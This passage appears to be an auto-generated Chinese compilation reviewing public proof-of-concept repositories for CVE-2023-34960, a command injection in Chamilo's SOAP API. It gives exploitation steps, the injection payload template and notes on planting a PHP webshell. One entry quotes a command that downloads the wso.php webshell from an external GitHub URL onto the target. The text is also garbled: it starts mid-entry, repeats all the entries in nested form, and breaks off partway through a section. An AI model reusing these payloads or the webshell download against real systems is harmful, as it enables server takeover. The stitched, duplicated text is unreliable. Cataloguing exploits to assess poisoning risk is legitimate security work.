查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.x <= 1.11.18

**利用条件:** 需要访问 Chamilo 系统的 Web 服务接口（SOAP API），目标服务器开启wsConvertPpt组件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11.x 到 1.11.18 版本中 wsConvertPpt 组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的 PowerPoint 文件名，并利用 SOAP API 调用 wsConvertPpt 组件，从而执行任意命令。利用方式是通过 SOAP API 传递恶意的 PowerPoint 文件名，文件名中包含需要执行的系统命令。由于服务器端没有对文件名进行充分的过滤，导致系统命令被执行。提供的漏洞利用代码仅为GPL协议文件，并无任何恶意代码，判断投毒的可能性为0%。根据搜索结果，已经有Metasploit模块利用该漏洞。

**项目地址:** [dvtarsoul/ChExp](https://github.com/dvtarsoul/ChExp)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---



---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
